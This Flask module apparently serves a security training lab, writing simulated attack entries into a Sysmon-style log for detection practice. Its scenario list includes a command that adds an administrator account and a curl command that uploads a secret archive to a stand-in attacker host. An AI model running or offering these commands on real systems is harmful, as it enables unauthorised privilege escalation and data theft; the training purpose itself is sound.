from flask import Blueprint, render_template, request, redirect, url_for, flash
from flask_login import login_required
import os

training_bp = Blueprint("training_lab", __name__)
SIMULATION_LOG = "app/uploads/sysmon_realtime.log"

SCENARIOS = {
    "phishing_email": "User clicked phishing link from attacker@example.com",
    "powershell_obfuscation": "Encoded PowerShell detected: Invoke-Obfuscation",
    "privilege_escalation": "net localgroup administrators hacker /add",
    "malicious_payload": "Malicious executable dropped in C:\\Users\\Public\\",
    "data_exfiltration": "curl -F data=@secret.zip http://evil.com/upload"
}

@training_bp.route("/training", methods=["GET", "POST"])
@login_required
def training_lab():
    if request.method == "POST":
        if request.form.get("clear") == "true":
            open(SIMULATION_LOG, "w").close()
            flash("🧹 Cleared sysmon_realtime.log successfully.", "info")
            return redirect(url_for("training_lab.training_lab"))

        selected = request.form.getlist("scenarios")
        if selected:
            with open(SIMULATION_LOG, "a") as f:
                for attack in selected:
                    if attack in SCENARIOS:
                        f.write(SCENARIOS[attack] + "\n")
            flash(f"✅ Injected {len(selected)} APT entries into the log.", "success")
            return redirect(url_for("training_lab.training_lab"))

        flash("⚠️ No scenario selected.", "warning")

    return render_template("training_lab.html", scenarios=SCENARIOS)
